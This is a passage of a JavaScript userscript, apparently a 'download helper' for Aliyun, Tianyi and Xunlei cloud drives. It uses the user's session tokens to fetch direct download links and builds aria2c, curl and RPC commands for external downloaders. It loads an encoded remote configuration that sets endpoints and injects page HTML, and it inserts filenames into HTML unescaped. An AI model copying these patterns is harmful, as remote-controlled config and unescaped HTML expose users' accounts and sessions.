message.error(&#x27;提示：请打开文件夹后勾选文件！&#x27;); &#125; if (pt === &#x27;share&#x27;) &#123; if (selectList.length &gt; 20) &#123; return message.error(&#x27;提示：单次最多可勾选 20 个文件！&#x27;); &#125; try &#123; let authorization = `$&#123;base.getStorage(&#x27;token&#x27;).token_type&#125; $&#123;base.getStorage(&#x27;token&#x27;).access_token&#125;`; let xShareToken = base.getStorage(&#x27;shareToken&#x27;).share_token; for (let i = 0; i &lt; selectList.length; i++) &#123; let res = await base.post(pan.pcs[0], &#123; expire_sec: 600, file_id: selectList[i].fileId, share_id: selectList[i].shareId &#125;, &#123; authorization, &quot;content-type&quot;: &quot;application/json;charset=utf-8&quot;, &quot;x-share-token&quot;: xShareToken &#125;); if (res.download_url) &#123; selectList[i].downloadUrl = res.download_url; &#125; &#125; &#125; catch (e) &#123; return message.error(&#x27;提示：请先登录网盘！&#x27;); &#125; &#125; let html = this.generateDom(selectList); this.showMainDialog(pan[mode][0], html, pan[mode][1]); &#125;, generateDom(list) &#123; let content = &#x27;&lt;div class=&quot;pl-main&quot;&gt;&#x27;; let alinkAllText = &#x27;&#x27;; list.forEach((v, i) =&gt; &#123; if (v.type === &#x27;folder&#x27;) return; let filename = v.name; let fid = v.fileId; let did = v.driveId; let size = base.sizeFormat(v.size); let dlink = v.downloadUrl || v.url; if (mode === &#x27;api&#x27;) &#123; content += `&lt;div class=&quot;pl-item&quot;&gt; &lt;div class=&quot;pl-item-name listener-tip&quot; data-size=&quot;$&#123;size&#125;&quot;&gt;$&#123;filename&#125;&lt;/div&gt; &lt;a class=&quot;pl-item-link listener-link-api&quot; data-did=&quot;$&#123;did&#125;&quot; data-fid=&quot;$&#123;fid&#125;&quot; data-filename=&quot;$&#123;filename&#125;&quot; data-link=&quot;$&#123;dlink&#125;&quot; data-index=&quot;$&#123;i&#125;&quot;&gt;$&#123;dlink&#125;&lt;/a&gt; &lt;/div&gt;`; &#125; if (mode === &#x27;aria&#x27;) &#123; let alink = this.convertLinkToAria(dlink, filename, navigator.userAgent); alinkAllText += alink + &#x27;\\r\\n&#x27;; content += `&lt;div class=&quot;pl-item&quot;&gt; &lt;div class=&quot;pl-item-name listener-tip&quot; data-size=&quot;$&#123;size&#125;&quot;&gt;$&#123;filename&#125;&lt;/div&gt; &lt;a class=&quot;pl-item-link listener-link-aria&quot; href=&quot;$&#123;alink&#125;&quot; title=&quot;点击复制aria2c链接&quot; data-filename=&quot;$&#123;filename&#125;&quot; data-link=&quot;$&#123;alink&#125;&quot;&gt;$&#123;decodeURIComponent(alink)&#125;&lt;/a&gt; &lt;/div&gt;`; &#125; if (mode === &#x27;rpc&#x27;) &#123; content += `&lt;div class=&quot;pl-item&quot;&gt; &lt;div class=&quot;pl-item-name listener-tip&quot; data-size=&quot;$&#123;size&#125;&quot;&gt;$&#123;filename&#125;&lt;/div&gt; &lt;button class=&quot;pl-item-link listener-link-rpc pl-btn-primary pl-btn-info&quot; data-filename=&quot;$&#123;filename&#125;&quot; data-link=&quot;$&#123;dlink&#125;&quot;&gt;&lt;em class=&quot;icon icon-device&quot;&gt;&lt;/em&gt;&lt;span style=&quot;margin-left: 5px;&quot;&gt;推送到 RPC 下载器&lt;/span&gt;&lt;/button&gt;&lt;/div&gt;`; &#125; if (mode === &#x27;curl&#x27;) &#123; let alink = this.convertLinkToCurl(dlink, filename, navigator.userAgent); alinkAllText += alink + &#x27;\\r\\n&#x27;; content += `&lt;div class=&quot;pl-item&quot;&gt; &lt;div class=&quot;pl-item-name listener-tip&quot; data-size=&quot;$&#123;size&#125;&quot;&gt;$&#123;filename&#125;&lt;/div&gt; &lt;a class=&quot;pl-item-link listener-link-aria&quot; href=&quot;$&#123;alink&#125;&quot; title=&quot;点击复制curl链接&quot; data-filename=&quot;$&#123;filename&#125;&quot; data-link=&quot;$&#123;alink&#125;&quot;&gt;$&#123;decodeURIComponent(alink)&#125;&lt;/a&gt; &lt;/div&gt;`; &#125; if (mode === &#x27;bc&#x27;) &#123; let alink = this.convertLinkToBC(dlink, filename, navigator.userAgent); content += `&lt;div class=&quot;pl-item&quot;&gt; &lt;div class=&quot;pl-item-name listener-tip&quot; data-size=&quot;$&#123;size&#125;&quot;&gt;$&#123;filename&#125;&lt;/div&gt; &lt;a class=&quot;pl-item-link&quot; href=&quot;$&#123;decodeURIComponent(alink)&#125;&quot; title=&quot;点击用比特彗星下载&quot; data-filename=&quot;$&#123;filename&#125;&quot; data-link=&quot;$&#123;alink&#125;&quot;&gt;$&#123;decodeURIComponent(alink)&#125;&lt;/a&gt; &lt;/div&gt;`; &#125; &#125;); content += &#x27;&lt;/div&gt;&#x27;; if (mode === &#x27;aria&#x27;) content += `&lt;div class=&quot;pl-extra&quot;&gt;&lt;button class=&quot;pl-btn-primary listener-copy-all&quot; data-link=&quot;$&#123;alinkAllText&#125;&quot;&gt;复制全部链接&lt;/button&gt;&lt;/div&gt;`; if (mode === &#x27;rpc&#x27;) &#123; let rpc = base.getValue(&#x27;setting_rpc_domain&#x27;) + &#x27;:&#x27; + base.getValue(&#x27;setting_rpc_port&#x27;) + base.getValue(&#x27;setting_rpc_path&#x27;); content += `&lt;div class=&quot;pl-extra&quot;&gt;&lt;button class=&quot;pl-btn-primary listener-send-rpc&quot;&gt;发送全部链接&lt;/button&gt;&lt;button title=&quot;$&#123;rpc&#125;&quot; class=&quot;pl-btn-primary pl-btn-warning listener-open-setting&quot; style=&quot;margin-left: 10px&quot;&gt;设置 RPC 参数（当前为：$&#123;rpc&#125;）&lt;/button&gt;&lt;button class=&quot;pl-btn-primary pl-btn-success listener-rpc-task&quot; style=&quot;margin-left: 10px;display: none&quot;&gt;查看下载任务&lt;/button&gt;&lt;/div&gt;`; &#125; if (mode === &#x27;curl&#x27;) content += `&lt;div class=&quot;pl-extra&quot;&gt;&lt;button class=&quot;pl-btn-primary listener-copy-all&quot; data-link=&quot;$&#123;alinkAllText&#125;&quot;&gt;复制全部链接&lt;/button&gt;&lt;button class=&quot;pl-btn-primary pl-btn-warning listener-open-setting&quot; style=&quot;margin-left: 10px;&quot;&gt;设置终端类型（当前为：$&#123;terminalType[base.getValue(&#x27;setting_terminal_type&#x27;)]&#125;）&lt;/button&gt;&lt;/div&gt;`; return content; &#125;, async sendLinkToRPC(filename, link) &#123; let rpc = &#123; domain: base.getValue(&#x27;setting_rpc_domain&#x27;), port: base.getValue(&#x27;setting_rpc_port&#x27;), path: base.getValue(&#x27;setting_rpc_path&#x27;), token: base.getValue(&#x27;setting_rpc_token&#x27;), dir: base.getValue(&#x27;setting_rpc_dir&#x27;), &#125;; let url = `$&#123;rpc.domain&#125;:$&#123;rpc.port&#125;$&#123;rpc.path&#125;`; let rpcData = &#123; id: new Date().getTime(), jsonrpc: &#x27;2.0&#x27;, method: &#x27;aria2.addUri&#x27;, params: [`token:$&#123;rpc.token&#125;`, [link], &#123; dir: rpc.dir, out: filename, header: [`Referer: https://www.aliyundrive.com/`] &#125;] &#125;; try &#123; let res = await base.post(url, rpcData, &#123;&quot;Referer&quot;: &quot;https://www.aliyundrive.com/&quot;&#125;, &#x27;&#x27;); if (res.result) return &#x27;success&#x27;; return &#x27;fail&#x27;; &#125; catch (e) &#123; return &#x27;fail&#x27;; &#125; &#125;, getSelectedList() &#123; try &#123; let selectedList = []; let reactDom = document.getElementsByClassName(pan.dom.list)[0]; let reactObj = base.findReact(reactDom, 1); let props = reactObj.pendingProps; if (props) &#123; let fileList = props.dataSource || []; let selectedKeys = props.selectedKeys.split(&#x27;,&#x27;); fileList.forEach((val) =&gt; &#123; if (selectedKeys.includes(val.fileId)) &#123; selectedList.push(val); &#125; &#125;); &#125; return selectedList; &#125; catch (e) &#123; return []; &#125; &#125;, detectPage() &#123; let path = location.pathname; if (/^\\/(drive)/.test(path)) return &#x27;home&#x27;; if (/^\\/(s|share)\\//.test(path)) return &#x27;share&#x27;; return &#x27;&#x27;; &#125;, isOnlyFolder() &#123; for (let i = 0; i &lt; selectList.length; i++) &#123; if (selectList[i].type === &#x27;file&#x27;) return false; &#125; return true; &#125;, showMainDialog(title, html, footer) &#123; Swal.fire(&#123; title, html, footer, allowOutsideClick: false, showCloseButton: true, showConfirmButton: false, position: &#x27;top&#x27;, width, padding: &#x27;15px 20px 5px&#x27;, customClass, &#125;); &#125;, async initPanLinker() &#123; base.initDefaultConfig(); base.addPanLinkerStyle(); pt = this.detectPage(); let res = await base.post (`https://api.youxiaohou.com/config/ali?ver=$&#123;version&#125;&amp;a=$&#123;author&#125;`, &#123;&#125;, &#123;&#125;, &#x27;text&#x27;); pan = JSON.parse(base.d(res)); Object.freeze &amp;&amp; Object.freeze(pan); pan.num === base.getValue(&#x27;setting_init_code&#x27;) ? this.addButton() : this.addInitButton(); base.createTip(); base.registerMenuCommand(); &#125; &#125;; let tianyi = &#123; convertLinkToAria(link, filename, ua) &#123; filename = base.fixFilename(filename); return encodeURIComponent(`aria2c &quot;$&#123;link&#125;&quot; --out &quot;$&#123;filename&#125;&quot;`); &#125;, convertLinkToBC(link, filename, ua) &#123; let bc = `AA/$&#123;encodeURIComponent(filename)&#125;/?url=$&#123;encodeURIComponent(link)&#125;ZZ`; return encodeURIComponent(`bc://http/$&#123;base.e(bc)&#125;`); &#125;, convertLinkToCurl(link, filename, ua) &#123; let terminal = base.getValue(&#x27;setting_terminal_type&#x27;); filename = base.fixFilename(filename); return encodeURIComponent(`$&#123;terminal !== &#x27;wp&#x27; ? &#x27;curl&#x27; : &#x27;curl.exe&#x27;&#125; -L -C - &quot;$&#123;link&#125;&quot; -o &quot;$&#123;filename&#125;&quot;`); &#125;, addPageListener() &#123; doc.on(&#x27;click&#x27;, &#x27;.pl-button-mode&#x27;, (e) =&gt; &#123; mode = e.target.dataset.mode; Swal.showLoading(); this.getPCSLink(); &#125;); doc.on(&#x27;click&#x27;, &#x27;.listener-link-api&#x27;, async (e) =&gt; &#123; e.preventDefault(); $(&#x27;#downloadIframe&#x27;).attr(&#x27;src&#x27;, e.currentTarget.dataset.link); &#125;); doc.on(&#x27;click&#x27;, &#x27;.listener-link-aria, .listener-copy-all&#x27;, (e) =&gt; &#123; e.preventDefault(); base.setClipboard(decodeURIComponent(e.target.dataset.link)); $(e.target).text(&#x27;复制成功，快去粘贴吧！&#x27;).animate(&#123;opacity: &#x27;0.5&#x27;&#125;, &quot;slow&quot;); &#125;); doc.on(&#x27;click&#x27;, &#x27;.listener-link-rpc&#x27;, async (e) =&gt; &#123; let target = $(e.currentTarget); target.find(&#x27;.icon&#x27;).remove(); target.find(&#x27;.pl-loading&#x27;).remove(); target.prepend(base.createLoading()); let res = await this.sendLinkToRPC(e.currentTarget.dataset.filename, e.currentTarget.dataset.link); if (res === &#x27;success&#x27;) &#123; $(&#x27;.listener-rpc-task&#x27;).show(); target.removeClass(&#x27;pl-btn-danger&#x27;).html(&#x27;发送成功，快去看看吧！&#x27;).animate(&#123;opacity: &#x27;0.5&#x27;&#125;, &quot;slow&quot;); &#125; else &#123; target.addClass(&#x27;pl-btn-danger&#x27;).text(&#x27;发送失败，请检查您的RPC配置信息！&#x27;).animate(&#123;opacity: &#x27;0.5&#x27;&#125;, &quot;slow&quot;); &#125; &#125;); doc.on(&#x27;click&#x27;, &#x27;.listener-send-rpc&#x27;, (e) =&gt; &#123; $(&#x27;.listener-link-rpc&#x27;).click(); $(e.target).text(&#x27;发送完成，发送结果见上方按钮！&#x27;).animate(&#123;opacity: &#x27;0.5&#x27;&#125;, &quot;slow&quot;); &#125;); doc.on(&#x27;click&#x27;, &#x27;.listener-open-setting&#x27;, () =&gt; &#123; base.showSetting(); &#125;); doc.on(&#x27;click&#x27;, &#x27;.listener-rpc-task&#x27;, () =&gt; &#123; let rpc = JSON.stringify(&#123; domain: base.getValue(&#x27;setting_rpc_domain&#x27;), port: base.getValue(&#x27;setting_rpc_port&#x27;), &#125;), url = `$&#123;pan.d&#125;/?rpc=$&#123;base.e(rpc)&#125;#$&#123;base.getValue(&#x27;setting_rpc_token&#x27;)&#125;`; GM_openInTab(url, &#123;active: true&#125;); &#125;); &#125;, addButton() &#123; if (!pt) return; let $toolWrap; let $button = $(`&lt;div class=&quot;tianyi-button pl-button&quot;&gt;下载助手&lt;ul class=&quot;pl-dropdown-menu&quot; style=&quot;top: 26px;&quot;&gt;&lt;li class=&quot;pl-dropdown-menu-item pl-button-mode&quot; data-mode=&quot;api&quot;&gt;API下载&lt;/li&gt;&lt;li class=&quot;pl-dropdown-menu-item pl-button-mode&quot; data-mode=&quot;aria&quot; &gt;Aria下载&lt;/li&gt;&lt;li class=&quot;pl-dropdown-menu-item pl-button-mode&quot; data-mode=&quot;rpc&quot;&gt;RPC下载&lt;/li&gt;&lt;li class=&quot;pl-dropdown-menu-item pl-button-mode&quot; data-mode=&quot;curl&quot;&gt;cURL下载&lt;/li&gt;&lt;li class=&quot;pl-dropdown-menu-item pl-button-mode&quot; data-mode=&quot;bc&quot; &gt;BC下载&lt;/li&gt;$&#123;pan.code == 200 &amp;&amp; version &lt; pan.version ? pan.new : &#x27;&#x27;&#125;&lt;/ul&gt;&lt;/div&gt;`); if (pt === &#x27;home&#x27;) &#123; let ins = setInterval(() =&gt; &#123; $toolWrap = $(pan.btn.home); if ($toolWrap.length &gt; 0) &#123; $toolWrap.prepend($button); clearInterval(ins); &#125; &#125;, 50); &#125; if (pt === &#x27;share&#x27;) &#123; let ins = setInterval(() =&gt; &#123; $toolWrap = $(pan.btn.share); if ($toolWrap.length &gt; 0) &#123; $toolWrap.prepend($button); clearInterval(ins); &#125; &#125;, 50); &#125; base.createDownloadIframe(); this.addPageListener(); &#125;, addInitButton() &#123; if (!pt) return; let $toolWrap; let $button = $(`&lt;div class=&quot;tianyi-button pl-button-init&quot;&gt;下载助手&lt;/div&gt;`); if (pt === &#x27;home&#x27;) &#123; let ins = setInterval(() =&gt; &#123; $toolWrap = $(pan.btn.home); if ($toolWrap.length &gt; 0) &#123; $toolWrap.prepend($button); clearInterval(ins); &#125; &#125;, 50); &#125; if (pt === &#x27;share&#x27;) &#123; $button.css(&#123;&#x27;margin-right&#x27;: &#x27;10px&#x27;&#125;); let ins = setInterval(() =&gt; &#123; $toolWrap = $(pan.btn.share); if ($toolWrap.length &gt; 0) &#123; $toolWrap.prepend($button); clearInterval(ins); &#125; &#125;, 50); &#125; $button.click(() =&gt; base.initDialog()); &#125;, async getToken() &#123; let res = await base.getFinalUrl(pan.pcs[1], &#123;&#125;); let accessToken = res.match(/accessToken=(\\w+)/)?.[1]; accessToken &amp;&amp; base.setStorage(&#x27;accessToken&#x27;, accessToken); return accessToken; &#125;, async getFileUrlByOnce(item, index, token) &#123; try &#123; if (item.downloadUrl) return &#123; index, downloadUrl: item.downloadUrl &#125;; let time = Date.now(), fileId = item.fileId, o = &quot;AccessToken=&quot; + token + &quot;&amp;Timestamp=&quot; + time + &quot;&amp;fileId=&quot; + fileId, url = pan.pcs[2] + &#x27;?fileId=&#x27; + fileId; if (item.shareId) &#123; o = &quot;AccessToken=&quot; + token + &quot;&amp;Timestamp=&quot; + time + &quot;&amp;dt=1&amp;fileId=&quot; + fileId + &quot;&amp;shareId=&quot; + item.shareId; url += &#x27;&amp;dt=1&amp;shareId=&#x27; + item.shareId; &#125; let sign = md5(o).toString(); let res = await base.get(url, &#123; &quot;accept&quot;: &quot;application/json;charset=UTF-8&quot;, &quot;sign-type&quot;: 1, &quot;accesstoken&quot;: token, &quot;timestamp&quot;: time, &quot;signature&quot;: sign &#125;); if (res.res_code === 0) &#123; return &#123; index, downloadUrl: res.fileDownloadUrl &#125;; &#125; else if (res.errorCode === &#x27;InvalidSessionKey&#x27;) &#123; return &#123; index, downloadUrl: &#x27;提示：请先登录网盘！&#x27; &#125;; &#125; else if (res.res_code === &#x27;ShareNotFoundFlatDir&#x27;) &#123; return &#123; index, downloadUrl: &#x27;提示：请先[转存]文件，👉前往[我的网盘]中下载！&#x27; &#125;; &#125; else &#123; return &#123; index, downloadUrl: &#x27;获取下载地址失败，请刷新重试！&#x27; &#125;; &#125; &#125; catch (e) &#123; return &#123; index, downloadUrl: &#x27;获取下载地址失败，请刷新重试！&#x27; &#125;; &#125; &#125;, async getPCSLink() &#123; selectList = this.getSelectedList(); if (selectList.length === 0) &#123; return message.error(&#x27;提示：请先勾选要下载的文件！&#x27;); &#125; if (this.isOnlyFolder()) &#123; return message.error(&#x27;提示：请打开文件夹后勾选文件！&#x27;); &#125; let token = base.getStorage(&#x27;accessToken&#x27;) || await this.getToken(); if (!token) &#123; return message.error(&#x27;提示：请先登录网盘！&#x27;); &#125; let queue = []; selectList.forEach((item, index) =&gt; &#123; queue.push(this.getFileUrlByOnce(item, index, token)); &#125;); const res = await Promise.all(queue); res.forEach(val =&gt; &#123; selectList[val.index].downloadUrl = val.downloadUrl; &#125;); let html = this.generateDom(selectList); this.showMainDialog(pan[mode][0], html, pan[mode][1]); &#125;, generateDom(list) &#123; let content = &#x27;&lt;div class=&quot;pl-main&quot;&gt;&#x27;; let alinkAllText = &#x27;&#x27;; list.forEach((v, i) =&gt; &#123; if (v.isFolder) return; let filename = v.fileName; let size = base.sizeFormat(v.size); let dlink = v.downloadUrl; if (mode === &#x27;api&#x27;) &#123; content += `&lt;div class=&quot;pl-item&quot;&gt; &lt;div class=&quot;pl-item-name listener-tip&quot; data-size=&quot;$&#123;size&#125;&quot;&gt;$&#123;filename&#125;&lt;/div&gt; &lt;a class=&quot;pl-item-link listener-link-api&quot; data-filename=&quot;$&#123;filename&#125;&quot; data-link=&quot;$&#123;dlink&#125;&quot; data-index=&quot;$&#123;i&#125;&quot;&gt;$&#123;dlink&#125;&lt;/a&gt; &lt;/div&gt;`; &#125; if (mode === &#x27;aria&#x27;) &#123; let alink = this.convertLinkToAria(dlink, filename, navigator.userAgent); alinkAllText += alink + &#x27;\\r\\n&#x27;; content += `&lt;div class=&quot;pl-item&quot;&gt; &lt;div class=&quot;pl-item-name listener-tip&quot; data-size=&quot;$&#123;size&#125;&quot;&gt;$&#123;filename&#125;&lt;/div&gt; &lt;a class=&quot;pl-item-link listener-link-aria&quot; href=&quot;$&#123;alink&#125;&quot; title=&quot;点击复制aria2c链接&quot; data-filename=&quot;$&#123;filename&#125;&quot; data-link=&quot;$&#123;alink&#125;&quot;&gt;$&#123;decodeURIComponent(alink)&#125;&lt;/a&gt; &lt;/div&gt;`; &#125; if (mode === &#x27;rpc&#x27;) &#123; content += `&lt;div class=&quot;pl-item&quot;&gt; &lt;div class=&quot;pl-item-name listener-tip&quot; data-size=&quot;$&#123;size&#125;&quot;&gt;$&#123;filename&#125;&lt;/div&gt; &lt;button class=&quot;pl-item-link listener-link-rpc pl-btn-primary pl-btn-info&quot; data-filename=&quot;$&#123;filename&#125;&quot; data-link=&quot;$&#123;dlink&#125;&quot;&gt;&lt;em class=&quot;icon icon-device&quot;&gt;&lt;/em&gt;&lt;span style=&quot;margin-left: 5px;&quot;&gt;推送到 RPC 下载器&lt;/span&gt;&lt;/button&gt;&lt;/div&gt;`; &#125; if (mode === &#x27;curl&#x27;) &#123; let alink = this.convertLinkToCurl(dlink, filename, navigator.userAgent); alinkAllText += alink + &#x27;\\r\\n&#x27;; content += `&lt;div class=&quot;pl-item&quot;&gt; &lt;div class=&quot;pl-item-name listener-tip&quot; data-size=&quot;$&#123;size&#125;&quot;&gt;$&#123;filename&#125;&lt;/div&gt; &lt;a class=&quot;pl-item-link listener-link-aria&quot; href=&quot;$&#123;alink&#125;&quot; title=&quot;点击复制curl链接&quot; data-filename=&quot;$&#123;filename&#125;&quot; data-link=&quot;$&#123;alink&#125;&quot;&gt;$&#123;decodeURIComponent(alink)&#125;&lt;/a&gt; &lt;/div&gt;`; &#125; if (mode === &#x27;bc&#x27;) &#123; let alink = this.convertLinkToBC(dlink, filename, navigator.userAgent); content += `&lt;div class=&quot;pl-item&quot;&gt; &lt;div class=&quot;pl-item-name listener-tip&quot; data-size=&quot;$&#123;size&#125;&quot;&gt;$&#123;filename&#125;&lt;/div&gt; &lt;a class=&quot;pl-item-link&quot; href=&quot;$&#123;decodeURIComponent(alink)&#125;&quot; title=&quot;点击用比特彗星下载&quot; data-filename=&quot;$&#123;filename&#125;&quot; data-link=&quot;$&#123;alink&#125;&quot;&gt;$&#123;decodeURIComponent(alink)&#125;&lt;/a&gt; &lt;/div&gt;`; &#125; &#125;); content += &#x27;&lt;/div&gt;&#x27;; if (mode === &#x27;aria&#x27;) content += `&lt;div class=&quot;pl-extra&quot;&gt;&lt;button class=&quot;pl-btn-primary listener-copy-all&quot; data-link=&quot;$&#123;alinkAllText&#125;&quot;&gt;复制全部链接&lt;/button&gt;&lt;/div&gt;`; if (mode === &#x27;rpc&#x27;) &#123; let rpc = base.getValue(&#x27;setting_rpc_domain&#x27;) + &#x27;:&#x27; + base.getValue(&#x27;setting_rpc_port&#x27;) + base.getValue(&#x27;setting_rpc_path&#x27;); content += `&lt;div class=&quot;pl-extra&quot;&gt;&lt;button class=&quot;pl-btn-primary listener-send-rpc&quot;&gt;发送全部链接&lt;/button&gt;&lt;button title=&quot;$&#123;rpc&#125;&quot; class=&quot;pl-btn-primary pl-btn-warning listener-open-setting&quot; style=&quot;margin-left: 10px&quot;&gt;设置 RPC 参数（当前为：$&#123;rpc&#125;）&lt;/button&gt;&lt;button class=&quot;pl-btn-primary pl-btn-success listener-rpc-task&quot; style=&quot;margin-left: 10px;display: none&quot;&gt;查看下载任务&lt;/button&gt;&lt;/div&gt;`; &#125; if (mode === &#x27;curl&#x27;) content += `&lt;div class=&quot;pl-extra&quot;&gt;&lt;button class=&quot;pl-btn-primary listener-copy-all&quot; data-link=&quot;$&#123;alinkAllText&#125;&quot;&gt;复制全部链接&lt;/button&gt;&lt;button class=&quot;pl-btn-primary pl-btn-warning listener-open-setting&quot; style=&quot;margin-left: 10px;&quot;&gt;设置终端类型（当前为：$&#123;terminalType[base.getValue(&#x27;setting_terminal_type&#x27;)]&#125;）&lt;/button&gt;&lt;/div&gt;`; return content; &#125;, async sendLinkToRPC(filename, link) &#123; let rpc = &#123; domain: base.getValue(&#x27;setting_rpc_domain&#x27;), port: base.getValue(&#x27;setting_rpc_port&#x27;), path: base.getValue(&#x27;setting_rpc_path&#x27;), token: base.getValue(&#x27;setting_rpc_token&#x27;), dir: base.getValue(&#x27;setting_rpc_dir&#x27;), &#125;; let url = `$&#123;rpc.domain&#125;:$&#123;rpc.port&#125;$&#123;rpc.path&#125;`; let rpcData = &#123; id: new Date().getTime(), jsonrpc: &#x27;2.0&#x27;, method: &#x27;aria2.addUri&#x27;, params: [`token:$&#123;rpc.token&#125;`, [link], &#123; dir: rpc.dir, out: filename, header: [] &#125;] &#125;; try &#123; let res = await base.post(url, rpcData, &#123;&#125;, &#x27;&#x27;); if (res.result) return &#x27;success&#x27;; return &#x27;fail&#x27;; &#125; catch (e) &#123; return &#x27;fail&#x27;; &#125; &#125;, getSelectedList() &#123; try &#123; return document.querySelector(&quot;.c-file-list&quot;).__vue__.selectedList; &#125; catch (e) &#123; return [document.querySelector(&quot;.info-detail&quot;).__vue__.fileDetail]; &#125; &#125;, detectPage() &#123; let path = location.pathname; if (/^\\/web\\/main/.test(path)) return &#x27;home&#x27;; if (/^\\/web\\/share/.test(path)) return &#x27;share&#x27;; return &#x27;&#x27;; &#125;, isOnlyFolder() &#123; for (let i = 0; i &lt; selectList.length; i++) &#123; if (!selectList[i].isFolder) return false; &#125; return true; &#125;, showMainDialog(title, html, footer) &#123; Swal.fire(&#123; title, html, footer, allowOutsideClick: false, showCloseButton: true, showConfirmButton: false, position: &#x27;top&#x27;, width, padding: &#x27;15px 20px 5px&#x27;, customClass, &#125;); &#125;, async initPanLinker() &#123; base.initDefaultConfig(); base.addPanLinkerStyle(); pt = this.detectPage(); let res = await base.post (`https://api.youxiaohou.com/config/tianyi?ver=$&#123;version&#125;&amp;a=$&#123;author&#125;`, &#123;&#125;, &#123;&#125;, &#x27;text&#x27;); pan = JSON.parse(base.d(res)); Object.freeze &amp;&amp; Object.freeze(pan); pan.num === base.getValue(&#x27;setting_init_code&#x27;) ? this.addButton() : this.addInitButton(); this.getToken(); base.createTip(); base.registerMenuCommand(); &#125; &#125;; let xunlei = &#123; convertLinkToAria(link, filename, ua) &#123; filename = base.fixFilename(filename); return encodeURIComponent(`aria2c &quot;$&#123;link&#125;&quot; --out &quot;$&#123;filename&#125;&quot;`); &#125;, convertLinkToBC(link, filename, ua) &#123; let bc = `AA/$&#123;encodeURIComponent(filename)&#125;/?url=$&#123;encodeURIComponent(link)&#125;ZZ`; return encodeURIComponent(`bc://http/$&#123;base.e(bc)&#125;`); &#125;, convertLinkToCurl(link, filename, ua) &#123; let terminal = base.getValue(&#x27;setting_terminal_type&#x27;); filename = base.fixFilename(filename); return encodeURIComponent(`$&#123;terminal !== &#x27;wp&#x27; ? &#x27;curl&#x27; : &#x27;curl.exe&#x27;&#125; -L -C - &quot;$&#123;link&#125;&quot; -o &quot;$&#123;filename&#125;&quot;`); &#125;, addPageListener() &#123; doc.on(&#x27;click&#x27;, &#x27;.pl-button-mode&#x27;, (e) =&gt; &#123; mode = e.target.dataset.mode; Swal.showLoading(); this.getPCSLink(); &#125;); doc.on(&#x27;click&#x27;, &#x27;.listener-link-api&#x27;, async (e) =&gt; &#123; e.preventDefault(); $(&#x27;#downloadIframe&#x27;).attr(&#x27;src&#x27;, e.currentTarget.dataset.link); &#125;); doc.on(&#x27;click&#x27;, &#x27;.listener-link-api-btn&#x27;, async (e) =&gt; &#123; base.setClipboard(e.target.dataset.filename); $(e.target).text(&#x27;复制成功&#x27;).animate(&#123;opacity: &#x27;0.5&#x27;&#125;, &quot;slow&quot;); &#125;); doc.on(&#x27;click&#x27;, &#x27;.listener-link-bc-btn&#x27;, async (e) =&gt; &#123; let mirror = base.getMirrorList(e.target.dataset.dlink, pan.mirror); base.setClipboard(mirror); $(e.target).text(&#x27;复制成功&#x27;).animate(&#123;opacity: &#x27;0.5&#x27;&#125;, &quot;slow&quot;); &#125;); doc.on(&#x27;click&#x27;, &#x27;.listener-link-aria, .listener-copy-all&#x27;, (e) =&gt; &#123; e.preventDefault(); base.setClipboard(decodeURIComponent(e.target.dataset.link)); $(e.target).text(&#x27;复制成功，快去粘贴吧！&#x27;).animate(&#123;opacity: &#x27;0.5&#x27;&#125;, &quot;slow&quot;); &#125;); doc.on(&#x27;click&#x27;, &#x27;.listener-link-rpc&#x27;, async (e) =&gt; &#123; let target = $(e.currentTarget); target.find(&#x27;.icon&#x27;).remove(); target.find(&#x27;.pl-loading&#x27;).remove(); target.prepend(base.createLoading()); let res = await this.sendLinkToRPC(e.currentTarget.dataset.filename, e.currentTarget.dataset.link); if (res === &#x27;success&#x27;) &#123; $(&#x27;.listener-rpc-task&#x27;).show(); target.removeClass(&#x27;pl-btn-danger&#x27;).html(&#x27;发送成功，快去看看吧！&#x27;).animate(&#123;opacity: &#x27;0.5&#x27;&#125;, &quot;slow&quot;); &#125; else &#123; target.addClass(&#x27;pl-btn-danger&#x27;).text(&#x27;发送失败，请检查您的RPC配置信息！&#x27;).animate(&#123;opacity: &#x27;0.5&#x27;&#125;, &quot;slow&quot;); &#125; &#125;); doc.on(&#x27;click&#x27;, &#x27;.listener-send-rpc&#x27;, (e) =&gt; &#123; $(&#x27;.listener-link-rpc&#x27;).click(); $(e.target).text(&#x27;发送完成，发送结果见上方按钮！&#x27;).animate(&#123;opacity: &#x27;0.5&#x27;&#125;, &quot;slow&quot;); &#125;); doc.on(&#x27;click&#x27;, &#x27;.listener-open-setting&#x27;, () =&gt; &#123; base.showSetting(); &#125;); doc.on(&#x27;click&#x27;, &#x27;.listener-rpc-task&#x27;, () =&gt; &#123; let rpc = JSON.stringify(&#123; domain: base.getValue(&#x27;setting_rpc_domain&#x27;), port: base.getValue(&#x27;setting_rpc_port&#x27;), &#125;), url = `$&#123;pan.d&#125;/?rpc=$&#123;base.e(rpc)&#125;#$&#123;base.getValue(&#x27;setting_rpc_token&#x27;)&#125;`; GM_openInTab(url, &#123;active: true&#125;); &#125;); &#125;, addButton() &#123; if (!pt) return; let $toolWrap; let $button = $(`&lt;div class=&quot;xunlei-button pl-button&quot;&gt;&lt;i class=&quot;xlpfont xlp-download&quot;&gt;&lt;/i&gt;&lt;span style=&quot;font-size: 13px;margin-left: 6px;&quot;&gt;下载助手&lt;/span&gt;&lt;ul class=&quot;pl-dropdown-menu&quot; style=&quot;top: 34px;&quot;&gt;&lt;li class=&quot;pl-dropdown-menu-item pl-button-mode&quot; data-mode=&quot;api&quot;&gt;API下载&lt;/li&gt;&lt;li class=&quot;pl-dropdown-menu-item pl-button-mode&quot; data-mode=&quot;aria&quot; &gt;Aria下载&lt;/li&gt;&lt;li class=&quot;pl-dropdown-menu-item pl-button-mode&quot; data-mode=&quot;rpc&quot;&gt;RPC下载&lt;/li&gt;&lt;li class=&quot;pl-dropdown-menu-item pl-button-mode&quot; data-mode=&quot;curl&quot;&gt;cURL下载&lt;/li&gt;&lt;li class=&quot;pl-dropdown-menu-item pl-button-mode&quot; data-mode=&quot;bc&quot; &gt;BC下载&lt;/li&gt;$&#123;pan.code == 200 &amp;&amp; version &lt; pan.version ? pan.new : &#x27;&#x27;&#125;&lt;/ul&gt;&lt;/div&gt;`); if (pt === &#x27;home&#x27;) &#123; let ins = setInterval(() =&gt; &#123; $toolWrap = $(pan.btn.home); if ($toolWrap.length &gt; 0) &#123; $toolWrap.prepend($button); clearInterval(ins); &#125; &#125;, 50); &#125; if (pt === &#x27;share&#x27;) &#123; $button.css(&#123;&#x27;margin-right&#x27;: &#x27;10px&#x27;&#125;); let ins = setInterval(() =&gt; &#123; $toolWrap = $(pan.btn.share); if ($toolWrap.length 